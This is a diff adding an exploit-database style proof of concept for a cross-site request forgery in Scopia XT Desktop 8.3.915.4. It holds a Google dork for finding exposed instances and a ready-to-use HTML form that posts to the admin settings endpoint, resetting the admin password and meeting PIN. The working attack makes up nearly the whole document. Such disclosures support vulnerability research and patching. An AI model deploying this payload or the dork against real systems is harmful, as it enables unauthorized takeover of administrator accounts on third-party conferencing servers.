@@ -1,0 +1,29 @@
+# Exploit Title: Scopia XT Desktop 8.3.915.4 - Cross-Site Request Forgery (change admin password)
+# Google Dork: inurl:scopia+index.jsp
+# Date: 2020-09-09
+# Exploit Author: v1n1v131r4
+# Vendor Homepage: https://avaya.com
+# Software Link: https://support.avaya.com/downloads/download-details.action?contentId=C201772012204170_4&productId=P1605
+# Version: 8.3.915.4
+# Tested on: Windows 10 Pro
+# CVE : N/A
+# PoC: https://github.com/V1n1v131r4/Exploit-CSRF-on-SCOPIA-XT-Desktop-version-8.3.915.4
+
+
+# CSRF to change admin password
+# The admin password will be changed to "attacker"
+
+<!DOCTYPE html>
+<html>
+<body>
+<form method="POST" action="http://example.org:80/scopia/admin/directory_settings.jsp">
+<input type="text" name="JSESSIONID" value="">
+<input type="text" name="newadminusername" value="">
+<input type="text" name="newadminpassword" value="3B09A36C1C32CF30EB8169F43227957C">
+<input type="text" name="newenablext1000meetingpin" value="false">
+<input type="text" name="newxt1000meetingpin" value="EB8169F43227957C">
+<input type="text" name="checkstatus" value="true">
+<input type="submit" value="Send">
+</form>
+</body>
+</html>
